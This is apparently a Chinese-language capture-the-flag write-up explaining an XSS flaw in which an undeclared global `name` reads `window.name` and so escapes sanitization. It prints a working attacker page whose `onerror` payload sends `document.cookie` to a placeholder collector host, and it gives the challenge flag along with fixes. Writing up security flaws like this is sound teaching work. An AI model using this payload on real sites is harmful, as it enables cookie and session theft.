# My Name ___

## 题目简述

名称卡页面会把查询参数 `name` HTML 转义后写入 `innerHTML`，表面上无法直接 XSS。但脚本把 `name` 当作未声明的全局变量；当 URL 没有该参数时，它实际读取跨页面导航仍会保留的 `window.name`，从而绕过只作用于查询参数的净化。

## 解题过程

渲染逻辑的关键分支是：

```javascript
if (hasParam('name')) {
    name = sanitizeName(getParam('name'));
}
const display = name || 'Your Name Here';
document.getElementById('name').innerHTML = display;
```

这里没有 `let`、`const` 或 `var`。浏览器中的裸标识符 `name` 会解析到 `window.name`；而 `window.name` 属于浏览上下文，跨源导航后仍然保留。只要最终挑战 URL不带 `name` 参数，`sanitizeName` 就不会执行。

在攻击者页面先设置一段 HTML，再跳转到挑战页面：

```html
<!doctype html>
<script>
window.name = `<img src=x onerror="location='//COLLECTOR/?c='+encodeURIComponent(document.cookie)">`;
location.href = 'http://CHALLENGE/';
</script>
```

把该页面 URL 提交给题目的访问机器人。机器人预先给挑战域设置了名为 `flag` 且非 HttpOnly 的 cookie；导航到挑战后，保存的 `window.name` 被赋给 `innerHTML`，图片加载失败触发 `onerror`，cookie 随查询参数发送到收集端：

```text
flag=grey{dONt_lEave_Var1a8leS_unDEf1ned}
```

实际部署地址和一次性收集域都不影响漏洞机制，因此不在归档中保留赛时临时 URL。

## 方法总结

净化输入时必须追踪所有数据源，而不是只保护查询参数。`window.name` 是经典的跨源持久状态，未声明全局变量又让它意外进入 DOM sink。修复方式包括始终声明局部变量、避免 `innerHTML`，并把展示文本写入 `textContent`。
